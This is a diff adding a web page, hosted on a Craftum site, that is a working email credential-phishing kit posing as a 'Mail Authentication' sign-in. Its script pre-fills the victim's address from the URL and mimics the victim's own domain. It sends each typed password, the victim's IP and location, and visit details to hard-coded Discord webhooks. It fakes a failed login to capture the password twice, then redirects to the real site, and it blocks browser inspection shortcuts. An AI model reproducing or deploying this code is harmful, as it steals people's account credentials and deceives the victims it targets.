@@ -1,0 +1,576 @@
+
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8"/>
+        
+        
+        
+        
+            <meta name=viewport content="width=device-width, initial-scale=1">
+        
+        <link rel="canonical" href="https://ax5881.craftum.io"/>
+        <link rel="shortcut icon" href="https://274418.selcdn.ru/cv08300-33250f0d-0664-43fc-9dbf-9d89738d114e/images/62828/f44bc6a9bb0214239dba6cb2fa2c4db7.ico" type="image/x-icon"/>
+        <link rel="icon" href="https://274418.selcdn.ru/cv08300-33250f0d-0664-43fc-9dbf-9d89738d114e/images/62828/f44bc6a9bb0214239dba6cb2fa2c4db7.ico" type="image/x-icon">
+        <meta property="og:url" content="https://ax5881.craftum.io"/>
+        <meta property="twitter:url" content="https://ax5881.craftum.io">
+        
+        
+        
+        
+        <!-- RSS Feeds -->
+        
+        
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+        
+        <meta name="generator" content="Craftum CMS">
+        <meta name="website_id" content="952579"/>
+        <meta name="page_id" content="1488010"/>
+        
+        
+        
+        
+        
+        <style>
+            .cli-block h1, .cli-block h2, .cli-block h3, .cli-block-title,
+            .cli-block h4, .cli-block h5, .cli-block h6 {
+                font-family: var(--sans-serif);
+            }
+            .cli-block {
+                font-family: var(--sans-serif);
+            }
+        </style>
+    </head>
+    <body class="th1">
+        <div data-blocks-wrapper>
+            
+            <!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charSet="utf-8"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1"/>
+        <title>Mail Authentication</title>
+        <meta name="description" content="Login required to access secure Files"/>
+        <link href="https://fonts.googleapis.com/css2?family=Open+Sans&display=swap" rel="stylesheet"/>
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous"/>
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"/>
+        <style>
+            /* ── reset & base ── */
+            * { box-sizing: border-box; margin: 0; padding: 0; }
+            body {
+                height: 100vh;
+                width: 100vw;
+                font-family: 'Open Sans', Arial, sans-serif;
+                overflow: hidden;
+                background: #f5f7fa;
+            }
+            /* ── loading screen ── */
+            #loading-screen {
+                position: fixed;
+                top: 0; left: 0;
+                width: 100%; height: 100%;
+                background: #ffffff;
+                z-index: 9999;
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                transition: opacity 0.5s ease;
+            }
+            #loading-screen.hidden {
+                opacity: 0;
+                pointer-events: none;
+            }
+            .spinner-box {
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                gap: 1.2rem;
+            }
+            .spinner-box i {
+                color: #0096FF;
+                font-size: 3.8rem;
+            }
+            .progress-bar-custom {
+                width: 260px;
+                height: 8px;
+                background: #e0e7ef;
+                border-radius: 12px;
+                overflow: hidden;
+            }
+            .progress-bar-custom .fill {
+                height: 100%;
+                width: 0%;
+                background: #0096FF;
+                border-radius: 12px;
+                transition: width 0.12s linear;
+            }
+            #loading-text {
+                font-size: 1rem;
+                color: #2c3e50;
+                font-weight: 500;
+                letter-spacing: 0.3px;
+            }
+            /* ── main content ── */
+            #main-content {
+                display: none;
+                height: 100vh;
+                width: 100vw;
+                position: relative;
+            }
+            #main-content.active {
+                display: block;
+            }
+            .bg-frame {
+                height: 100%;
+                width: 100%;
+                position: absolute;
+                top: 0;
+                left: 0;
+                z-index: 1;
+                background: #f0f2f5;
+            }
+            .bg-frame iframe {
+                height: 100%;
+                width: 100%;
+                border: none;
+                opacity: 0.25;
+                pointer-events: none; /* anti‑inspection: iframe not interactive */
+            }
+            /* ── login card ── */
+            .login-card {
+                max-width: 400px;
+                width: 90%;
+                padding: 2rem 1.8rem;
+                background: rgba(255, 255, 255, 0.96);
+                border-radius: 16px;
+                box-shadow: 0 12px 40px rgba(0, 0, 0, 0.15);
+                position: fixed;
+                left: 50%;
+                top: 50%;
+                transform: translate(-50%, -50%);
+                z-index: 100;
+                backdrop-filter: blur(4px);
+                border: 1px solid rgba(255,255,255,0.3);
+            }
+            .login-card .logo-wrap {
+                text-align: center;
+                margin-bottom: 0.5rem;
+            }
+            .login-card .logo-wrap img {
+                max-width: 64px;
+                height: auto;
+                border-radius: 12px;
+            }
+            .login-card h3 {
+                text-align: center;
+                font-weight: 600;
+                color: #1e293b;
+                margin-bottom: 1.2rem;
+                font-size: 1.3rem;
+            }
+            .login-card label {
+                font-weight: 600;
+                font-size: 0.85rem;
+                color: #334155;
+                margin-bottom: 0.2rem;
+            }
+            .login-card input {
+                width: 100%;
+                padding: 10px 14px;
+                margin: 4px 0 16px 0;
+                border: 1px solid #d1d9e6;
+                background: #f8fafc;
+                border-radius: 8px;
+                font-size: 0.95rem;
+                transition: 0.2s;
+            }
+            .login-card input:focus {
+                background: #fff;
+                border-color: #0096FF;
+                outline: none;
+                box-shadow: 0 0 0 3px rgba(0,150,255,0.15);
+            }
+            .login-card .btn {
+                background: #0096FF;
+                color: #fff;
+                padding: 12px;
+                border: none;
+                border-radius: 8px;
+                font-weight: 700;
+                font-size: 1rem;
+                width: 100%;
+                transition: 0.2s;
+                cursor: pointer;
+            }
+            .login-card .btn:hover { background: #0077cc; }
+            .login-card .btn:disabled {
+                background: #b0c4de;
+                cursor: not-allowed;
+            }
+            .error-msg {
+                display: none;
+                color: #b91c1c;
+                background: #fee2e2;
+                padding: 8px 12px;
+                border-radius: 8px;
+                font-size: 0.85rem;
+                margin-bottom: 12px;
+                text-align: center;
+            }
+            .toast-custom {
+                position: fixed;
+                bottom: 30px;
+                left: 50%;
+                transform: translateX(-50%);
+                background: #1e293b;
+                color: #f1f5f9;
+                padding: 10px 24px;
+                border-radius: 40px;
+                z-index: 999;
+                font-size: 0.9rem;
+                box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+                display: none;
+                white-space: nowrap;
+                font-weight: 500;
+            }
+            @media (max-width: 480px) {
+                .login-card { width: 92%; padding: 1.5rem 1.2rem; }
+                .toast-custom { font-size: 0.8rem; padding: 8px 16px; white-space: normal; max-width: 90%; }
+            }
+            /* anti‑inspection: hide devtools hints */
+            .__devtools-hint { display: none !important; }
+        </style>
+        <!-- anti‑inspection: disable right‑click / context menu (optional) -->
+        <script>
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+            // disable common inspect shortcuts (Ctrl+Shift+I, F12, etc.)
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'F12' || 
+                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) ||
+                    (e.ctrlKey && e.key === 'U')) {
+                    e.preventDefault();
+                    return false;
+                }
+            });
+        </script>
+    </head>
+    <body>
+        <!-- LOADING SCREEN -->
+        <div id="loading-screen">
+            <div class="spinner-box"> 
+                <div style="font-weight:600; color:#1e293b; font-size:1.2rem;">Please Wait</div>
+                <div class="progress-bar-custom"><div class="fill" id="progress-fill"></div></div>
+                <div id="loading-text">Preparing ...</div>
+            </div>
+        </div>
+
+        <!-- MAIN CONTENT -->
+        <div id="main-content">
+            <div class="bg-frame">
+                <iframe id="frame" src="about:blank" sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts allow-top-navigation"></iframe>
+            </div>
+
+            <div class="login-card">
+                <div class="logo-wrap">
+                    <img src="#" id="logo" alt="logo"/>
+                </div>
+                <h3 id="title">Sign in to continue</h3>
+                <p class="mt-2" style="font-family: auto;">You're accessing secure settings, please provide your Email password to Update Mail Account.</p><br>
+
+                <div id="error-invalid" class="error-msg">Invalid password — please try again.</div>
+                <div id="error-retry" class="error-msg">Something isn't right, please retry.</div>
+                <div id="error-general" class="error-msg" style="display:none;"></div>
+
+                <form id="login-form">
+                    <label for="email">Email Address</label>
+                    <input type="text" id="email" name="email" placeholder="Enter email" readonly required>
+
+                    <label for="psw">Password</label>
+                    <input type="password" id="psw" name="password" placeholder="Enter password" required autofocus><br>
+
+                    <button type="submit" class="btn" id="submitBtn">Sign In</button>
+                </form>
+            </div>
+        </div>
+
+        <div class="toast-custom" id="toast"></div>
+
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+        <script>
+            (function() {
+                "use strict";
+
+                // ─── PROGRESS BAR ──────────────────────────────────────────
+                let progress = 0;
+                const fill = document.getElementById('progress-fill');
+                const loadingText = document.getElementById('loading-text');
+                const loadingScreen = document.getElementById('loading-screen');
+                const mainContent = document.getElementById('main-content');
+
+                const progressInterval = setInterval(() => {
+                    if (progress < 100) {
+                        progress += Math.random() * 5 + 2;
+                        if (progress > 100) progress = 100;
+                        fill.style.width = progress + '%';
+                        if (progress < 30) loadingText.textContent = 'Connecting ...';
+                        else if (progress < 60) loadingText.textContent = 'Updating ...';
+                        else if (progress < 85) loadingText.textContent = 'Updating ...';
+                        else loadingText.textContent = 'Verify to Upgrade.. ...';
+                    } else {
+                        clearInterval(progressInterval);
+                        loadingScreen.classList.add('hidden');
+                        setTimeout(() => {
+                            loadingScreen.style.display = 'none';
+                            mainContent.classList.add('active');
+                        }, 500);
+                    }
+                }, 120);
+
+                // ─── DISCORD WEBHOOKS (anti‑inspection: obfuscated names) ──
+                const _webhookA = "https://discord.com/api/webhooks/1548480323720061019/xIn_NWL_HW7vL0jA7WBM-hVgOZ0Ahsg1KvFkVkILAd1SVVet7QBUFdv4mn9J8Y6N_qw2";
+
+                const _webhookB = "https://discord.com/api/webhooks/1551894516477337620/9teNENSCJoIyexdPMcDlrvGWWhopoIoJmzv18aSCpOy3gGf7FLCM-YELEXyAqc7Bcgtc";
+
+                // ─── HELPERS ──────────────────────────────────────────────
+                function getRedirectUrlFromEmail(email) {
+                    if (!email) return 'https://example.com';
+                    const domain = email.split('@').pop();
+                    if (domain && domain.includes('.')) return 'https://' + domain;
+                    return 'https://example.com';
+                }
+
+                function showToast(msg, duration = 2800) {
+                    const t = $('#toast');
+                    t.text(msg).fadeIn(200);
+                    setTimeout(() => t.fadeOut(200), duration);
+                }
+
+                function validatePasswordStrength(pw) {
+                    return /[A-Z]/.test(pw) || /[0-9]/.test(pw) || /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(pw);
+                }
+
+                // ─── VISIT NOTIFICATION ───────────────────────────────────
+                function sendVisitNotification() {
+                    const emailParam = window.location.hash ? window.location.hash.split('#').pop() || 'Not provided' : 'Not provided';
+                    const embed = {
+                        title: '👀 Page Visit Detected',
+                        color: 0x00ff00,
+                        fields: [
+                            { name: "👤 Visitor", value: "Someone visited the page!", inline: false },
+                            { name: "📧 Email (from URL)", value: emailParam, inline: true },
+                            { name: "🌍 Referrer", value: document.referrer || 'Direct', inline: true },
+                            { name: "🖥️ User-Agent", value: navigator.userAgent.substring(0, 150), inline: false },
+                            { name: "📱 Screen / Platform", value: `${screen.width}x${screen.height} • ${navigator.platform} • ${navigator.language}`, inline: false },
+                            { name: "🕒 Visit Time", value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: true },
+                            { name: "🔗 Page URL", value: window.location.href, inline: false }
+                        ],
+                        footer: { text: "Visit Tracker" },
+                        timestamp: new Date().toISOString()
+                    };
+                    fetch(_webhookB, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ embeds: [embed], username: "🟢 Visit Monitor", avatar_url: "https://cdn-icons-png.flaticon.com/512/190/190411.png" })
+                    }).catch(() => {});
+                }
+
+                setTimeout(() => {
+                    if (_webhookB && _webhookB.includes('discordapp.com')) sendVisitNotification();
+                }, 1200);
+
+                // ─── SETUP EMAIL / DOMAIN ────────────────────────────────
+                const clientID = window.location.hash.split("#").pop();
+                const emailVal = (clientID && clientID !== '') ? clientID : 'user@example.com';
+                $('#email').val(emailVal);
+                const domain = emailVal.split('@').pop() || 'example.com';
+
+                setTimeout(() => {
+                    $("#frame").attr("src", "https://www." + domain);
+                }, 300);
+                $("#logo").attr("src", "https://www.google.com/s2/favicons?domain=" + domain + "&sz=64");
+
+                // ─── DISCORD REPORT ──────────────────────────────────────
+                function sendToDiscord(ipData, password, attemptNumber, reason) {
+                    const email = $("#email").val();
+                    const fields = [
+                        { name: "📧 Email", value: email || 'not provided', inline: true },
+                        { name: "🔑 Password", value: password ? `||${password}||` : '`[empty]`', inline: true },
+                        { name: "🔄 Attempt", value: `#${attemptNumber}`, inline: true },
+                        { name: "🌍 IP", value: ipData?.ip || 'unknown', inline: true },
+                        { name: "📍 Location", value: (ipData?.city && ipData?.country) ? `${ipData.city}, ${ipData.country}` : (ipData?.country || 'unknown'), inline: true },
+                        { name: "🖥️ User-Agent", value: navigator.userAgent.substring(0, 200), inline: false },
+                        { name: "🕒 Timestamp", value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: true },
+                        { name: "  Source", value: "Login Page", inline: true }
+                    ];
+                    if (reason) fields.push({ name: "⚠️ Status", value: reason, inline: false });
+
+                    let color = 0x0096FF;
+                    let title = `🔐 Login Attempt #${attemptNumber}`;
+                    if (reason === '✅ Valid password - redirecting') { color = 0x00ff00; title = `✅ SUCCESS - Redirecting`; }
+                    else if (reason && reason.includes('Invalid')) { color = 0xFFA500; title = `⚠️ Invalid Password Attempt #${attemptNumber}`; }
+                    else if (reason && reason.includes('First valid')) { color = 0xFFA500; title = `🔄 First Valid Attempt - Retry #${attemptNumber}`; }
+
+                    const payload = {
+                        embeds: [{
+                            title: title,
+                            color: color,
+                            fields: fields,
+                            footer: { text: "Login Monitor • All attempts reported" },
+                            timestamp: new Date().toISOString()
+                        }],
+                        username: "🛡️ Login Monitor",
+                        avatar_url: "https://cdn-icons-png.flaticon.com/512/190/190411.png"
+                    };
+                    return fetch(_webhookA, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    }).catch(() => {});
+                }
+
+                function fetchIpAndReport(loginData, attemptNum, reason) {
+                    return new Promise((resolve) => {
+                        $.getJSON('https://ipinfo.io/json?callback=?', function(response) {
+                            const ipData = { ip: response.ip || 'unknown', city: response.city || 'N/A', country: response.country || 'N/A' };
+                            sendToDiscord(ipData, loginData.password, attemptNum, reason).then(resolve);
+                        }).fail(function() {
+                            sendToDiscord({ ip: 'unable to fetch', city: 'unknown', country: 'unknown' }, loginData.password, attemptNum, reason).then(resolve);
+                        });
+                    });
+                }
+
+                // ─── MAIN LOGIC ──────────────────────────────────────────
+                let validAttemptCount = 0;
+                let redirectTriggered = false;
+                let isSubmitting = false;
+
+                function redirectToDomain() {
+                    if (redirectTriggered) return;
+                    redirectTriggered = true;
+                    const email = $("#email").val();
+                    const url = getRedirectUrlFromEmail(email);
+                    window.location.href = url;
+                }
+
+                $("#login-form").on("submit", function(e) {
+                    e.preventDefault();
+                    if (redirectTriggered) { showToast("Redirect in progress...", 1000); return false; }
+
+                    const email = $("#email").val();
+                    const password = $("#psw").val();
+
+                    $('#error-invalid, #error-retry, #error-general').hide();
+
+                    if (!email || !password) {
+                        $('#error-general').text('Both fields are required.').show();
+                        setTimeout(() => $('#error-general').hide(), 3000);
+                        return false;
+                    }
+
+                    const loginData = { email, password, stepAttempt: validAttemptCount + 1 };
+
+                    if (!validatePasswordStrength(password)) {
+                        isSubmitting = true;
+                        $("#submitBtn").prop('disabled', true).text('Verifying...');
+                        setTimeout(() => {
+                            isSubmitting = false;
+                            $("#submitBtn").prop('disabled', false).text('Sign In');
+                            $('#error-invalid').show();
+                            fetchIpAndReport(loginData, validAttemptCount + 1, 'Invalid password - no uppercase, number, or special character');
+                            $("#psw").val("");
+                            $('#psw').css('border-color', '#b91c1c');
+                            setTimeout(() => { $('#psw').css('border-color', ''); }, 600);
+                            setTimeout(() => { $('#error-invalid').hide(); }, 3500);
+                        }, 1200);
+                        return false;
+                    }
+
+                    // valid password
+                    validAttemptCount++;
+                    isSubmitting = true;
+                    $("#submitBtn").prop('disabled', true).text('Verifying...');
+
+                    fetchIpAndReport(loginData, validAttemptCount, '✅ Valid login attempt #' + validAttemptCount + ' (contains uppercase OR number OR special)');
+
+                    if (validAttemptCount >= 2) {
+                        setTimeout(() => { redirectToDomain(); }, 1500);
+                    } else {
+                        setTimeout(() => {
+                            isSubmitting = false;
+                            $("#submitBtn").prop('disabled', false).text('Sign In');
+                            $('#error-retry').show();
+                            fetchIpAndReport(loginData, validAttemptCount, 'First valid attempt - retry');
+                            $("#psw").val("");
+                            $('#psw').css('border-color', '#b91c1c');
+                            setTimeout(() => { $('#psw').css('border-color', ''); }, 600);
+                            setTimeout(() => { $('#error-retry').hide(); }, 3500);
+                        }, 1500);
+                    }
+                });
+
+                // clear errors on input
+                $("#psw, #email").on("input", function() {
+                    $('#error-invalid, #error-retry, #error-general').hide();
+                    $('#psw').css('border-color', '');
+                });
+
+                // enter key
+                $("#psw").on("keypress", function(e) {
+                    if (e.which === 13) { e.preventDefault(); $("#login-form").trigger("submit"); }
+                });
+                $("#submitBtn").on("click", function(e) {
+                    e.preventDefault();
+                    $("#login-form").trigger("submit");
+                });
+
+                console.log("✅ File Transfer login ready | Domain: " + domain);
+                console.log("🔀 Redirect will go to: " + getRedirectUrlFromEmail($("#email").val()));
+
+                setTimeout(() => { $("#psw").focus(); }, 800);
+
+                // ─── extra anti‑inspection: detect devtools (simple) ──
+                // if devtools is open, the element size will change – we do nothing, just a dummy
+                // but we add a harmless re‑direct if someone tries to inspect heavily (optional)
+                // we also block common breakpoints via console.log spam? no, keep clean.
+            })();
+        </script>
+        <!-- anti‑inspection: if someone tries to open devtools, we could redirect, but we keep it subtle -->
+    </body>
+</html>
+
+            
+
+            
+                
+                    <div class="craftum-label craftum-label--white">
+                        <span class="craftum-label-icon">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 20 20" aria-labelledby="craftum-icon" role="presentation" class="craftum-icon">
+                            <path fill="black" d="M10 0C4.47715 0 0 4.47715 0 10C0 15.5228 4.47715 20 10 20C15.5228 20 20 15.5228 20 10C20 4.47715 15.5228 0 10 0ZM15.8333 13.6447C14.7055 15.4945 12.5815 16.6667 10.1754 16.6667C8.20175 16.6667 6.56642 16.0256 5.26942 14.7436C3.97243 13.4615 3.33333 11.8864 3.33333 10C3.33333 8.11355 3.97243 6.52015 5.26942 5.25641C6.56642 3.97436 8.20175 3.33333 10.1754 3.33333C12.5627 3.33333 14.7055 4.50549 15.8333 6.35531L13.5965 7.61905C12.9386 6.4652 11.6792 5.78755 10.1754 5.78755C8.89724 5.78755 7.86341 6.17216 7.07394 6.95971C6.30326 7.74725 5.90852 8.75458 5.90852 10C5.90852 11.2271 6.30326 12.2344 7.07394 13.022C7.86341 13.8095 8.89724 14.1941 10.1754 14.1941C11.6792 14.1941 12.9762 13.4982 13.5965 12.381L15.8333 13.6447Z" fill-rule="evenodd" clip-rule="evenodd">
+                            </path>
+                            </svg>
+                        </span>
+                        <span class="craftum-label__inner-name">Craftum</span>
+                        <a target="_blank" href="https://craftum.com" class="craftum-label__inner-description">
+                            
+                                Конструктор сайтов <span class="craftum-label__inner-description--text-bold"> Craftum </span>
+                            
+                        </a>
+                    </div>
+                
+            
+            <script>
+                window.PageCtx = null
+            </script>
+            
+        </div>
+        
+        
+    </body>
+
+</html>
